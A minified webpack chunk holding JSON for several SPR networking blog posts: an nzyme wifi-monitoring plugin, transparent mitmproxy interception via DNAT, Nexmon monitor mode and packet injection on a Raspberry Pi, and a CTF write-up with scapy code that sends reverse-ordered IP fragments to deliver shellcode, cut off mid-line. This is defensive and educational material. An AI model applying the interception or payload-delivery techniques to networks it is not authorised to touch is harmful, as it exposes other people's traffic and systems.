"use strict";(self.webpackChunkspr_docs=self.webpackChunkspr_docs||[]).push([[9304],{64464:e=>{e.exports=JSON.parse('{"blogPosts":[{"id":"spr-nzyme-tap","metadata":{"permalink":"/pages/blog/spr-nzyme-tap","source":"@site/blog/2023-11-16-nzyme.md","title":"Loading an nzyme tap on SPR","description":"Nzyme lets people monitor their wifi networks with sensors that collect wifi data (as well as network traffic).","date":"2023-11-16T00:00:00.000Z","formattedDate":"November 16, 2023","tags":[{"label":"wifi","permalink":"/pages/blog/tags/wifi"},{"label":"nzyme","permalink":"/pages/blog/tags/nzyme"},{"label":"defense","permalink":"/pages/blog/tags/defense"},{"label":"blue-team","permalink":"/pages/blog/tags/blue-team"}],"readingTime":0.405,"hasTruncateMarker":false,"authors":[{"name":"Alex Radocea","url":"https://twitter.com/defendtheworld","key":"ltsrad"}],"frontMatter":{"slug":"spr-nzyme-tap","title":"Loading an nzyme tap on SPR","authors":"ltsrad","tags":["wifi","nzyme","defense","blue-team"]},"unlisted":false,"nextItem":{"title":"Transparent Socket Forwarding with SPR and MITMProxy","permalink":"/pages/blog/spr-mitmproxy"}},"content":"[Nzyme](https://www.nzyme.org/) lets people monitor their wifi networks with sensors that collect wifi data (as well as network traffic).\\n\\nIt can detect common wifi attack tools and tactics like deauths for getting WPA2 handshakes to crack,\\nrogue APs, and more.\\n\\nWe\'ve put together a plugin that can run alongside the SPR AP without affecting the channels, by creating a monitor interface. While this won\'t be able to detect Rogue APs, it can detect some anomalous activity.\\n\\nThe plugin is available at [https://github.com/spr-networks/spr-nzyme-tap/](https://github.com/spr-networks/spr-nzyme-tap/)"},{"id":"spr-mitmproxy","metadata":{"permalink":"/pages/blog/spr-mitmproxy","source":"@site/blog/2023-11-14-mitmproxy.md","title":"Transparent Socket Forwarding with SPR and MITMProxy","description":"Update","date":"2023-11-14T00:00:00.000Z","formattedDate":"November 14, 2023","tags":[{"label":"mitmproxy","permalink":"/pages/blog/tags/mitmproxy"},{"label":"microsegmentation","permalink":"/pages/blog/tags/microsegmentation"},{"label":"transparent sockets","permalink":"/pages/blog/tags/transparent-sockets"},{"label":"PLUS","permalink":"/pages/blog/tags/plus"}],"readingTime":1.93,"hasTruncateMarker":false,"authors":[{"name":"Alex Radocea","url":"https://twitter.com/defendtheworld","key":"ltsrad"}],"frontMatter":{"slug":"spr-mitmproxy","title":"Transparent Socket Forwarding with SPR and MITMProxy","authors":"ltsrad","tags":["mitmproxy","microsegmentation","transparent sockets","PLUS"]},"unlisted":false,"prevItem":{"title":"Loading an nzyme tap on SPR","permalink":"/pages/blog/spr-nzyme-tap"},"nextItem":{"title":"Loading up nexmon on a RPI4 with SPR","permalink":"/pages/blog/spr-nexmon"}},"content":"## Update\\nThis post has become a guide which is being kept up to date, [check it out!](/pages/docs/guides_plus/mitmproxy)\\n\\n## Overview\\n\\nIn this post we\'ll show how PLUS members can add a `mitmproxy` plugin to their SPR setup,\\nand then use the [Programmable Firewall (PFW)](https://www.supernetworks.org/plus.html) plugin to redirect traffic through `mitmproxy` with DNAT forwarding.\\n\\nWe do not need to configure our clients with proxy settings to point to `mitmproxy`, or rewrite DNS responses,\\nsince we are using the PFW feature to do the redirection.\\n\\n[This plugin is available on github.](https://github.com/spr-networks/spr-mitmproxy)\\n\\n### Prepare the plugin\\nfrom the SPR directory, typically `/home/spr/super`\\n```bash\\ncd plugins\\ngit clone https://github.com/spr-networks/spr-mitmproxy\\necho [\\\\\\"plugins/spr-mitmproxy/docker-compose.yml\\\\\\"] > ../configs/base/custom_compose_paths.json\\ncd spr-mitmproxy\\ndocker compose build\\n```\\n\\n### Configure SPR\\n1. Navigate to the SPR UI. Add mitmproxy under the Plugins page\\n-  be sure its been added to `configs/base/custom_compose_paths.json` as above\\n- Enable it by toggling the slider\\n![](https://github.com/spr-networks/spr-mitmproxy/assets/37549748/dcc0f1ea-724a-4ed0-856a-56444ea2569f)\\n\\n2. Add `mitmweb0` to the custom interface rules. You can verify your container\'s network address in the Container tab ->\\nUnder `Firewall-> Custom Interface Access` Add a new rule, make sure mitmproxy has `wan` at least to access the internet.\\n\\n![](https://github.com/spr-networks/spr-mitmproxy/assets/37549748/71d4c8c9-3812-452f-86df-a7d19fb703a6)\\n\\n3. Create a forwarding rule to the container web interface :8081. Pick an arbitrary IP in the subnet -- although not the same one as the container as that confuses dnat.\\n![](https://github.com/spr-networks/spr-mitmproxy/assets/37549748/ff1424c6-b6ad-48d4-8ffe-03186f61abc6)\\n\\n4. Create a site forward rule with PFW for traffic to intercept\\n![](https://github.com/spr-networks/spr-mitmproxy/assets/37549748/4d5e49b4-5860-4aad-ac17-510589ee31c5)\\n\\n### Using mitmproxy\\nThen make a curl request from any of the LAN devices, and it should populate on the mitmweb host. This was the :8081 host that was earlier defined\\n![](https://github.com/spr-networks/spr-mitmproxy/assets/37549748/a70a9f7e-91b9-4798-926b-2cb625f71e78)\\n\\n\\n## Leveraging Transparent Sockets\\n\\nBehind the scenes, `mitmproxy` is using transparent sockets with DNAT. Inside the container network,\\nwe establish dnat rules to `mitmproxy` from incoming ports `80`, `443`.\\n\\n```bash\\n#!/bin/bash\\n\\nnft -f - << EOF\\ntable inet nat {\\n        chain prerouting {\\n                type nat hook prerouting priority filter; policy accept;\\n                tcp dport { 80, 443 } dnat ip to 127.0.0.1:9999\\n        }\\n}\\nEOF\\n\\nmitmweb -p 9999 -m transparent --web-host 0.0.0.0\\n```\\n\\n## We\'d love to hear from you\\n\\nWe\'re always thrilled to get feedback on plugins people would like to see, and we\'re\\nexcited to hear about what people will be able to do with `mitmproxy` running\\nalongside SPR. Drop a line at [outreach[at]supernetworks.org](mailto:outreach+s@supernetworks.org) or join us on [discord](https://discord.com/invite/EUjTKJPPAX)"},{"id":"spr-nexmon","metadata":{"permalink":"/pages/blog/spr-nexmon","source":"@site/blog/2023-11-1-nexmon-spr.md","title":"Loading up nexmon on a RPI4 with SPR","description":"The built-in wifi radio on a Raspberry Pi 4 is kind of sad, as it does not support monitor mode.","date":"2023-11-01T00:00:00.000Z","formattedDate":"November 1, 2023","tags":[{"label":"Raspberry Pi","permalink":"/pages/blog/tags/raspberry-pi"},{"label":"Python","permalink":"/pages/blog/tags/python"},{"label":"Scapy","permalink":"/pages/blog/tags/scapy"},{"label":"WiFi","permalink":"/pages/blog/tags/wi-fi"},{"label":"Linux","permalink":"/pages/blog/tags/linux"},{"label":"Nexmon","permalink":"/pages/blog/tags/nexmon"},{"label":"Seemoo Labs","permalink":"/pages/blog/tags/seemoo-labs"}],"readingTime":4.675,"hasTruncateMarker":false,"authors":[{"name":"Alex Radocea","url":"https://twitter.com/defendtheworld","key":"ltsrad"}],"frontMatter":{"slug":"spr-nexmon","title":"Loading up nexmon on a RPI4 with SPR","authors":"ltsrad","tags":["Raspberry Pi","Python","Scapy","WiFi","Linux","Nexmon","Seemoo Labs"]},"unlisted":false,"prevItem":{"title":"Transparent Socket Forwarding with SPR and MITMProxy","permalink":"/pages/blog/spr-mitmproxy"},"nextItem":{"title":"Attack Surface Reduction Research (Part 1)","permalink":"/pages/blog/barely-ap-surfaces"}},"content":"The built-in wifi radio on a Raspberry Pi 4 is kind of sad, as it does not support monitor mode.\\nLuckily the hackers at Seemo Labs have fixed this.\\n\\nIn this post we\'ll describe how to load Seemoo\'s Nexmon onto a pi4 running a modern kernel, and package it into a SPR Plugin\\nnamed  [spr-nexmon](https://github.com/spr-networks/spr-nexmon/tree/main). We\'ll demonstrate that packet capture and injection works.\\n\\n## First, we will copy the template plugin\\n\\n```shell-session\\n$ cp -R super/api_sample_plugin/ spr-nexmon\\n```\\n\\n## Development\\n\\n### Prebuilt binaries\\n\\nWe\'ll use some prebuilt binaries that include\\n- the nexmon firmware build for the broadcom wifi radio\\n- the 6.2 kernel build\\n- the nexutil binary\\n\\nThese were built from the [6.1/6.2 support pull-request](https://github.com/seemoo-lab/nexmon/compare/master...DrSchottky:nexmon:rpi-6.1.y)\\n\\n```shell-session\\n$ cp -R ../nexmon/binaries spr-nexmon/binaries\\n```\\n\\n### Docker preparations\\n\\nWe\'ll update the Dockerfile to include some useful tools and build the project.\\n\\n```docker\\nFROM ubuntu:23.04 as builder\\nENV DEBIAN_FRONTEND=noninteractive\\nRUN apt-get update\\nRUN apt-get install -y --no-install-recommends nano ca-certificates git curl\\nRUN mkdir /code\\nWORKDIR /code\\nARG TARGETARCH\\nRUN curl -O https://dl.google.com/go/go1.20.linux-${TARGETARCH}.tar.gz\\nRUN rm -rf /usr/local/go && tar -C /usr/local -xzf go1.20.linux-${TARGETARCH}.tar.gz\\nENV PATH=\\"/usr/local/go/bin:$PATH\\"\\nCOPY code/ /code/\\n\\nARG USE_TMPFS=true\\nRUN --mount=type=tmpfs,target=/tmpfs \\\\\\n    [ \\"$USE_TMPFS\\" = \\"true\\" ] && ln -s /tmpfs /root/go; \\\\\\n    go build -ldflags \\"-s -w\\" -o /nexmon_plugin /code/nexmon_plugin.go\\n\\n\\nFROM ghcr.io/spr-networks/container_template:latest\\nENV DEBIAN_FRONTEND=noninteractive\\nRUN apt-get update && apt-get install -y --no-install-recommends tcpdump kmod iw wireless-regdb && rm -rf /var/lib/apt/lists/*\\nCOPY scripts /scripts/\\nCOPY --from=builder /nexmon_plugin /\\nCOPY binaries/ nexmon/\\nENTRYPOINT [\\"/scripts/startup.sh\\"]\\n```\\n\\nWe also want this container to use the host network and be privileged so it\\ncan load kernel modules. And we\'ll also set it to restart automatically\\n\\nAnd heres the docker-compose.yml:\\n\\n```yaml\\nversion: \'3.4\'\\n\\nx-logging:\\n  &default-logging\\n  driver: journald\\n\\nx-labels:\\n  &default-labels\\n  org.supernetworks.ci: ${CI:-false}\\n  org.supernetworks.version: ${RELEASE_VERSION:-latest}${RELEASE_CHANNEL:-}\\n\\nservices:\\n  nexmon:\\n    container_name: supernexmon\\n    build:\\n      context: .\\n      labels: *default-labels\\n    logging: *default-logging\\n    restart: always\\n    network_mode: host\\n    privileged: true\\n    volumes:\\n      - /etc/timezone:/etc/timezone:ro\\n      - /etc/localtime:/etc/localtime:ro\\n      - /lib/firmware/cypress/:/lib/firmware/cypress/\\n      - \\"${SUPERDIR}./state/plugins/nexmon:/state/plugins/nexmon\\"\\n      - \\"${SUPERDIR}./state/public/:/state/public/:ro\\"\\n```\\n\\n\\n### Extending the SPR API  \\nThe Nexmon patch breaks the ability to change channels normally. Instead, we can do it\\nwith the \'nexutil\' binary that nexmon provides.\\n\\n\\nWe\'ll rename `sample_plugin.go` to `nexmon_plugin.go` and define a new function\\n\\n```go\\nfunc changeChannel(w http.ResponseWriter, r *http.Request) {\\n\\tchannel := r.URL.Query().Get(\\"channel\\")\\n\\n\\t// Use regexp.MatchString to check if the input matches the pattern\\n\\tmatches, err := regexp.MatchString(\\"^[0-9/]*$\\", channel)\\n\\tif err != nil || !matches {\\n\\t\\thttp.Error(w, \\"Invalid channel string\\", 400)\\n\\t\\treturn\\n\\t}\\n\\n\\terr = exec.Command(\\"/nexmon/nexutil\\", \\"-k\\"+channel).Run()\\n\\tif err != nil {\\n\\t\\thttp.Error(w, err.Error(), 400)\\n\\t\\treturn\\n\\t}\\n}\\n//...\\nfunc main() {\\n//...\\n\\tunix_plugin_router.HandleFunc(\\"/change_channel\\", changeChannel).Methods(\\"PUT\\")\\n}\\n```\\n\\n### Updating the startup script\\n\\nWhen the container runs, we\'ll have it make sure the seemo firmware and kernel module\\nare loaded fresh.\\n\\nstartup.sh:\\n```bash\\n#!/bin/bash\\n\\ncd /nexmon\\ncp brcmfmac43455-sdio.bin /lib/firmware/cypress/cyfmac43455-sdio-standard.bin\\n\\nrmmod brcmfmac_wcc\\nrmmod brcmfmac\\n\\ninsmod brcmfmac.ko\\n\\nsleep 1\\n\\niw phy `iw dev wlan0 info | awk \'/wiphy/ {printf \\"phy\\" $2}\'` interface add mon0 type monitor\\n\\necho [+] Loaded\\n\\ncd /\\n/nexmon_plugin\\n```\\n\\n\\n## Loading\\n\\nAfter building, with `docker compose build`, we\'ll configure the API to load the plugin.\\n\\nIn the UI or by modifying `configs/base/api.json`, add the nexmon plugin*\\n```json\\n{\\n \\"Name\\": \\"nexmon\\",\\n \\"URI\\": \\"nexmon\\",\\n \\"UnixPath\\": \\"/state/plugins/nexmon/socket\\",\\n \\"Enabled\\": true,\\n \\"Plus\\": false,\\n \\"GitURL\\": \\"\\",\\n \\"ComposeFilePath\\": \\"\\"\\n}\\n```\\n\\n\\nStart the plugin with\\n```bash\\nSUPERDIR=/home/spr/super/ docker compose up -d\\n```\\n\\n\\n## Testing\\n\\nRunning tcpdump should show captured 802.11 packets from the environment\\n\\n```shell-session\\n# tcpdump -i wlan0 ...\\n\\ntcpdump: verbose output suppressed, use -v[v]... for full protocol decode\\nlistening on wlan0, link-type IEEE802_11_RADIO (802.11 plus radiotap header), snapshot length 262144 bytes\\n22:50:27.005540 1876482302us tsft 1.0 Mb/s 2412 MHz 11b -68dBm signal 0dBm noise Beacon (wifi-2.4) [1.0* 2.0* 5.5* 11.0* 6.0 9.0 12.0 18.0 Mbit] ESS CH: 1, PRIVACY\\n22:50:27.046106 1876522917us tsft 1.0 Mb/s 2412 MHz 11b -46dBm signal 0dBm noise Beacon (wifi-2.4) [1.0* 2.0* 5.5* 11.0* 6.0 9.0 12.0 18.0 Mbit] ESS CH: 1, PRIVACY\\n22:50:27.107930 1876584711us tsft 1.0 Mb/s 2412 MHz 11b -70dBm signal 0dBm noise Beacon (wifi-2.4) [1.0* 2.0* 5.5* 11.0* 6.0 9.0 12.0 18.0 Mbit] ESS CH: 1, PRIVACY\\n22:50:27.148500 1876625317us tsft 1.0 Mb/s 2412 MHz 11b -46dBm signal 0dBm noise Beacon (wifi-2.4) [1.0* 2.0* 5.5* 11.0* 6.0 9.0 12.0 18.0 Mbit] ESS CH: 1, PRIVACY\\n22:50:27.210323 1876687100us tsft 1.0 Mb/s 2412 MHz 11b -67dBm signal 0dBm noise Beacon (wifi-2.4) [1.0* 2.0* 5.5* 11.0* 6.0 9.0 12.0 18.0 Mbit] ESS CH: 1, PRIVACY\\n```\\n\\nWe can also verify that our channel switch api extension works\\n\\n```shell-session\\n# curl -u admin:admin localhost/plugins/nexmon/change_channel?channel=4/20 -X PUT\\n# iw dev\\n\\nphy#10\\n        Interface wlan0\\n                ifindex 44\\n                wdev 0xa00000002\\n                addr 00:00:00:00:00:00\\n                type monitor\\n                channel 4 (2427 MHz), width: 20 MHz, center1: 2427 MHz\\n        Interface mon0\\n                ifindex 43\\n                wdev 0xa00000001\\n                addr e4:5f:01:fd:a1:76\\n                type managed\\n                channel 4 (2427 MHz), width: 20 MHz, center1: 2427 MHz\\n                txpower 31.00 dBm\\n...\\n```\\n\\n*\\\\* Note that the SPR UI does not allow specifying a docker compose path directly from the UI.\\nInstead, a user can modify or create a list in `configs/base/custom_compose_paths.json` to do so.*\\n\\n## Running barely-ap\\n\\nBesides sniffing traffic, we can also do wild things with packet injection, like running a WPA2\\nAccess Point written in scapy\\n\\nSince the nexmon patch is a bit hacky, we set the wlan0 mac address ourselves and make sure the channel matches\\n```py\\nap = AP(\\"turtlenet\\", \\"password1234\\", mode=\\"iface\\", iface=\\"wlan0\\", mac=\\"e4:5f:01:cd:a1:76\\", channel=4)\\n```\\n\\n\u201cET VOIL\xc0!\u201d:\\n\\n```shell-session\\nroot@wifilab0:~/barely-ap/src# python3 ap.py                                                                                                                  \\ncommand failed: Device or resource busy (-16)\\nCreated TUN interface scapyap at 10.10.10.1. Bind it to your services if needed.\\nSending Authentication to 56:66:a3:9c:71:8b from e4:5f:01:cd:a1:76 (0x0B)...\\nSending Association Response (0x01)...\\nsent eapol m1 56:66:a3:9c:71:8b\\n[+] New associated station 56:66:a3:9c:71:8b for bssid e4:5f:01:cd:a1:76\\n```\\n\\n\\n## Want to try it yourself on SPR?\\n\\nYou can grab [spr-nexmon here ](https://github.com/spr-networks/spr-nexmon/tree/main)\\nand barely-ap at [https://github.com/spr-networks/barely-ap](https://github.com/spr-networks/barely-ap)."},{"id":"barely-ap-surfaces","metadata":{"permalink":"/pages/blog/barely-ap-surfaces","source":"@site/blog/2023-10-23-barely-attack-surface-experiments.md","title":"Attack Surface Reduction Research (Part 1)","description":"Reducing Attack Surfaces (Part 1)","date":"2023-10-23T00:00:00.000Z","formattedDate":"October 23, 2023","tags":[{"label":"Python","permalink":"/pages/blog/tags/python"},{"label":"Scapy","permalink":"/pages/blog/tags/scapy"},{"label":"WiFi","permalink":"/pages/blog/tags/wi-fi"},{"label":"Linux","permalink":"/pages/blog/tags/linux"}],"readingTime":2.58,"hasTruncateMarker":false,"authors":[{"name":"Alex Radocea","url":"https://twitter.com/defendtheworld","key":"ltsrad"}],"frontMatter":{"slug":"barely-ap-surfaces","title":"Attack Surface Reduction Research (Part 1)","authors":"ltsrad","tags":["Python","Scapy","WiFi","Linux"]},"unlisted":false,"prevItem":{"title":"Loading up nexmon on a RPI4 with SPR","permalink":"/pages/blog/spr-nexmon"},"nextItem":{"title":"One Weird Trick to fix your CTF Payloads","permalink":"/pages/blog/scapy-revfrag"}},"content":"## Reducing Attack Surfaces (Part 1)\\n\\nSPR lets users create adaptive, micro-segmented networks for connecting and managing devices.\\nIn addition to fine-grained network visibility we also build hardened software and\\nwork to avoid common security flaws. As SPR has matured we\'ve started taking on further efforts\\nto eliminate attack surfaces.\\n\\nWhen it comes to native code: we introduce none. As in, we have not written new native code for SPR anywhere.\\nWe have one BPF filter, and its otherwise golang all the way down. We also do not run standard native services\\nwhere we can avoid them. We have replaced traditional C code for services such as DNS and DHCP with golang implementations, namely CoreDNS and CoreDHCP.\\n\\nThe remaining native code targets that we have in SPR are as follows:\\n- The Linux kernel. For example: ethernet, the tcp/ip stack, nftables, the mac80211 framework and vendor drivers\\n- 802.11 Firmware, Ethernet Firmware\\n- Hostapd\\n- PPP Daemon (off by default)\\n- OS Services (Ubuntu)\\n\\n## Targeting the Whole WiFi Stack\\n\\nWe believe the wifi firmware to be today\'s most insecure target (along with the vendor drivers). Many firmwares are blackbox,\\npoorly documented, and opaque to public security research. We want SPR to be immune to attacks like [Broadpwn](https://blog.exodusintel.com/2017/07/26/broadpwn/)\\nand [Qualcomm Exploitation](https://i.blackhat.com/USA-19/Thursday/us-19-Pi-Exploiting-Qualcomm-WLAN-And-Modem-Over-The-Air-wp.pdf).\\n\\nWe\'ve previously published [barely-ap](https://github.com/spr-networks/barely-ap) to teach people about WiFi authentication.\\nIt can and does work with real wifi chips running in monitor mode to connect clients over the air. We\'ve tested with Android, iOS, and Linux devices.\\n\\nThe plan is to build a series of experiments to host high-speed wifi.\\n\\nIn the near term:\\n1. Develop a Proof-of-Concept AP with scapy in monitor mode (DONE)\\n2. Develop a shim from monitor frames to hostapd running under mac80211_hwsim. This is a work in progress.\\nWe would like to see a rust kernel driver/userland daemon for this\\n\\nFuture:\\n\\n3. A full AP written in rust, operating on raw 802.11 frames (not relying on the Linux kernel 802.11 subsystem)\\n4. Rust protocol firmware for a wifi chip.\\n\\n## Developing a Shim Explained\\n\\nBy running the card in monitor mode,  protocol parsing in the card firmware is substantially reduced if not altogether eliminated.\\n\\nAnd with relaying frames over to macsim, hostapd is good to go.\\nWhat needs to happen however is making this incredibly fast, and researching rate negotiation and\\nwhat calls might need to be made to firmware to enable higher coding rates.\\n\\nBy using hostapd and the kernel mac80211 stack, we still maintain some native attack surface, however we get a known working,\\nsecurity-tested AP that will be compatible with a wide variety of devices, without the firmware protocol parsing and the vendor driver parsing.\\n\\nFor next steps, a proof-of-concept with scapy is actually much too slow. We want to start\\nwith a rust userland daemon leveraging iouring. If that doesn\'t fly then we\'ll go to a shim in the kernel.\\n\\n## Interested in working with us? Please reach out\\n\\nWe are actively seeking an intern to help develop rust+wifi for SPR.\\n\\nYou can contact us at  spr-wifi [ a-t ] supernetworks.org  or hop on the [discord](https://discord.gg/EUjTKJPPAX)"},{"id":"scapy-revfrag","metadata":{"permalink":"/pages/blog/scapy-revfrag","source":"@site/blog/2023-09-15-noppenheimer.md","title":"One Weird Trick to fix your CTF Payloads","description":"Noppenheimer","date":"2023-09-15T00:00:00.000Z","formattedDate":"September 15, 2023","tags":[{"label":"scapy","permalink":"/pages/blog/tags/scapy"},{"label":"fragmentation","permalink":"/pages/blog/tags/fragmentation"},{"label":"pwntools","permalink":"/pages/blog/tags/pwntools"},{"label":"tcpip","permalink":"/pages/blog/tags/tcpip"}],"readingTime":5.66,"hasTruncateMarker":false,"authors":[{"name":"Alex Radocea","url":"https://twitter.com/defendtheworld","key":"ltsrad"}],"frontMatter":{"slug":"scapy-revfrag","title":"One Weird Trick to fix your CTF Payloads","authors":"ltsrad","tags":["scapy","fragmentation","pwntools","tcpip"]},"unlisted":false,"prevItem":{"title":"Attack Surface Reduction Research (Part 1)","permalink":"/pages/blog/barely-ap-surfaces"},"nextItem":{"title":"How to use the SPR 1-click install on DigitalOcean","permalink":"/pages/blog/virtual-spr-1click"}},"content":"## Noppenheimer\\n\\nAt Defcon CTF Finals, the Final round of  [LiveCTF](https://livectf.com/) went into sudden death.\\nThe challenge was named Noppenheimer, a play on the Oppenheimer film that was released, and NOP (NO-OP) instructions.\\n\\nContestants had to turn a random sequence of bytes into a gadget/shellcode cave by converting bytes into NOPs,\\nby sending \\"nuke\\" Launch commands.\\n\\n```\\nOptions:\\nLAUNCH x,y - Launch a test at position x,y\\nVIEW - See state of test site\\nENDTEST - Conclude testing\\n>\\n```\\n\\nBoth teams solved locally.  But they couldn\'t exploit Noppenheimer against the remote system.\\n\\n## What Went Wrong\\n\\nTeams used a single `read/recv` syscall to receive to get shellcode to run. Without any delays in the program,\\nthe call will return quickly and if the payload is larger than the MTU it will return partial TCP data.\\nThe payloads were crashing on the remote end as they didn\'t have working shellcode.\\n\\nAs @ZetaTwo and @psifertex [explain](https://youtu.be/VxDnpShqloA?t=16683), the conditions which cause this are\\nhighly specific to the exploit with payload length, delays, and other factors. The testers exploits didnt trigger this problem.\\n\\n## Solving with IP Fragmentation\\n\\nIP Packets can be fragmented into multiple packets when they exceed the MTU size,\\nwhich is the maximum amount of octets accepted at layer 2 on Ethernet.\\n\\nBy sending fragments in reverse order, it can be ensured that the recv/read call will\\nget all of the data that has been sent, even beyond the MTU size.\\n\\nHere is a python solution that combines scapy with pwntools, to run inside of a container, which does just that.\\n\\n![](/img/noppenheimer.gif)\\n\\nAs a bonus, it also includes a semi-working TCP implementation written in pure scapy/python.\\n\\n```python\\n#!/usr/bin/env python3\\n# -*- coding: UTF-8 -*-\\n# Author: alex@supernetworks.org <github.com/lts-rad>\\n\'\'\'\\nDemo of TCP w/ sending fragmented payloads with scapy.\\n\\nRun this code inside of a namespace/container. Since Linux sends RST for forged SYN packets,\\nthis code will use iptables to block them.\\n\\n#> iptables -A OUTPUT -p tcp --tcp-flags RST RST -s <src_ip> -j DROP\\n\'\'\'\\nfrom scapy.all import *\\nimport logging\\nfrom pwn import *\\n\\nlogger = logging.getLogger(__name__)\\n#logging.basicConfig(level=logging.DEBUG)\\n#logger.setLevel(logging.DEBUG)\\n\\nclass TcpHandshake(object):\\n\\n    class RLoop(threading.Thread):\\n        def __init__(self, tcp):\\n            threading.Thread.__init__(self)\\n            self.tcp = tcp\\n\\n        def handle_recv(self, pkt):\\n            if pkt and pkt.haslayer(IP) and pkt.haslayer(TCP):\\n                if pkt[TCP].flags & 0x3f == 0x12:   # SYN+ACK\\n                    logger.debug(\\"RCV: SYN+ACK\\")\\n                    self.tcp.send_synack_ack(pkt)\\n                    return\\n                elif  pkt[TCP].flags & 4 != 0:      # RST\\n                    logger.debug(\\"RCV: RST\\")\\n                    #raise Exception(\\"RST\\")\\n                    self.tcp.abort = True\\n                    return\\n                elif pkt[TCP].flags & 0x1 == 1:     # FIN\\n                    logger.debug(\\"RCV: FIN\\")\\n                    self.tcp.send_finack(pkt)\\n                    return\\n                elif pkt[TCP].flags.A: # ACK came in?\\n                    logger.debug(\\"RCV: ACK\\")\\n                    self.tcp.send_base = pkt[TCP].ack\\n\\n                    logger.debug(\\"RCV: %s\\"%repr(pkt))\\n                    if len(pkt[TCP].payload) > 0:\\n                        self.tcp.Q += [bytes(pkt[TCP].payload)]\\n                    self.tcp.send_ack(pkt)\\n\\n                    #great, got an ack, check the send queue for pending data\\n                    while len(self.tcp.send_queue) > 0:\\n                        ret = self.tcp.send_data(self.tcp.send_queue.pop(0))\\n                        if ret == False:\\n                            break\\n\\n                    return\\n                else:\\n                    logger.debug(\\"? Unhandled packet\\")\\n            return\\n\\n\\n        def run(self):\\n            ans = sniff(filter=\\"tcp port %s\\"%self.tcp.target[1], lfilter=self.tcp.match_packet, prn=self.handle_recv, store=False)\\n\\n    def __init__(self, target, sport=31337):\\n        self.seq = 0\\n        self.seq_next = 0\\n        self.target = target\\n        self.dst = next(iter(Net(target[0])))\\n        self.dport = target[1]\\n        self.sport = sport #random.randrange(0, 2**16)\\n        self.seq_start = random.randrange(0, 2**32)\\n        # options=[(\'WScale\', 7)]\\n        self.l4 = IP(version=4,dst=target[0])/TCP(sport=self.sport, dport=self.dport, flags=0,\\n                                        seq=self.seq_start, window=65535)\\n        self.src = self.l4.src\\n        self.Q = []\\n        self.abort = False\\n\\n\\n        self.send_base = self.l4[TCP].seq\\n        self.send_window = self.l4[TCP].window\\n        self.last_sent = self.send_base\\n        self.send_queue = []\\n\\n        self.last_ack  = 0\\n\\n        #let underlying handle ethernet\\n        self.s = conf.L3socket()\\n\\n        self.R = self.RLoop(self)\\n        self.R.start()\\n        logger.debug(\\"init: %s\\"%repr(target))\\n\\n    def start(self):\\n        logger.debug(\\"start\\")\\n        return self.send_syn()\\n\\n    def match_packet(self, pkt):\\n        if pkt.haslayer(IP) and pkt[IP].dst == self.l4[IP].src \\\\\\n           and pkt.haslayer(TCP) and pkt[TCP].dport == self.sport:\\n           if pkt[TCP].ack <= self.seq_next and pkt[TCP].ack >= self.seq_start:\\n               return True\\n           else:\\n               logger.debug(\\"ack was %d expected %d\\" % (pkt[TCP].ack, self.seq_next))\\n        return False\\n\\n    def send_syn(self):\\n        logger.debug(\\"SND: SYN\\")\\n        self.l4[TCP].flags = \\"S\\"\\n        self.seq_next = self.l4[TCP].seq + 1\\n        self.s.send(self.l4)\\n        self.l4[TCP].seq += 1\\n\\n    def send_synack_ack(self, pkt):\\n        logger.debug(\\"SND: SYN+ACK -> ACK with ack # %d\\" % (pkt[TCP].seq + 1))\\n        self.l4[TCP].ack = pkt[TCP].seq + 1\\n        self.l4[TCP].flags = \\"A\\"\\n        self.seq_next = self.l4[TCP].seq\\n        self.s.send(self.l4)\\n\\n    def send_data(self, d):\\n        if self.abort == True:\\n            print(\\"[-] not sending data, aborted !!!\\")\\n            return False\\n        self.l4[TCP].flags = \\"PA\\"\\n\\n        available = self.send_base + self.send_window - self.last_sent\\n\\n        if available == 0:\\n            self.send_queue += [d]\\n            # have to wait\\n            return False\\n        assert available >= 0\\n\\n        if available < len(d):\\n            d, chop = d[:available], d[available:]\\n            self.send_queue += [chop]\\n\\n        self.seq_next = self.l4[TCP].seq + len(d)\\n        self.last_sent = self.seq_next\\n        tosend = self.l4/d\\n\\n        self.s.send(tosend)\\n        self.l4[TCP].seq += len(d)\\n        return True\\n\\n    def send_frag_data(self, d, sz):\\n        if self.abort == True:\\n            print(\\"[-] not sending data, aborted !!!\\")\\n            return\\n        assert sz >= 8\\n        self.l4[TCP].flags = \\"PA\\"\\n\\n        #tbd send window handling for fragments(?)\\n        dat = self.l4/d\\n        fragments = fragment(dat, sz)\\n        for f in fragments[::-1]:\\n            self.s.send(f)\\n\\n        self.seq_next = self.l4[TCP].seq + len(d)\\n        self.last_sent = self.seq_next\\n        self.l4[TCP].seq += len(d)\\n        return True\\n\\n    def send_fin(self):\\n        logger.debug(\\"SND: FIN\\")\\n        self.l4[TCP].flags = \\"F\\"\\n        self.seq_next = self.l4[TCP].seq + 1\\n        self.s.send(self.l4)\\n        self.l4[TCP].seq += 1\\n\\n    def send_rst(self):\\n        logger.debug(\\"SND: RST\\")\\n        self.l4[TCP].flags = \\"R\\"\\n        self.seq_next = self.l4[TCP].seq + 1\\n        self.s.send(self.l4)\\n        self.l4[TCP].seq += 1\\n\\n    def send_finack(self, pkt):\\n        logger.debug(\\"SND: FIN+ACK\\")\\n        self.l4[TCP].flags = \\"FA\\"\\n        self.l4[TCP].ack = pkt[TCP].seq + 1\\n        self.seq_next = self.l4[TCP].seq + 1\\n        self.s.send(self.l4)\\n        self.l4[TCP].seq += 1\\n        #raise Exception(\\"FIN+ACK\\")\\n        self.abort = True\\n\\n    def send_ack(self, pkt):\\n        self.l4[TCP].flags = \\"A\\"\\n\\n        self.last_ack = pkt[TCP].ack\\n        to_acknowledge = len(pkt[TCP].payload)\\n        #logger.debug(\\"SND: ACK with ack # %d\\" % (pkt[TCP].seq + len(pkt[TCP].load)))\\n\\n        if to_acknowledge != 0:\\n            self.l4[TCP].ack = pkt[TCP].seq + to_acknowledge\\n            self.s.send(self.l4)\\n\\n    def recv(self, timeout):\\n        elapsed = 0\\n        while (timeout != 0) and (elapsed < timeout):\\n            if len(self.Q) > 0:\\n                retval = self.Q.pop(0)\\n                return retval\\n            time.sleep(0.01)\\n            elapsed += 0.\\n        #returning nothing\\n        return \\"\\"\\n\\n    def clear_recv(self):\\n        self.Q = []\\n\\n    def wait_all_acks(self, timeout=0):\\n        elapsed = 0\\n        delta = 0.1\\n        while (timeout != 0) and (elapsed < timeout):\\n            if self.last_ack == self.seq_next and len(self.send_queue) == 0:\\n                return True\\n            time.sleep(delta)\\n            elapsed += delta\\n        return False\\n\\n\\n\\nif __name__== \'__main__\':\\n    sport = random.randint(40000, 60000)\\n    os.system(\\"iptables -F 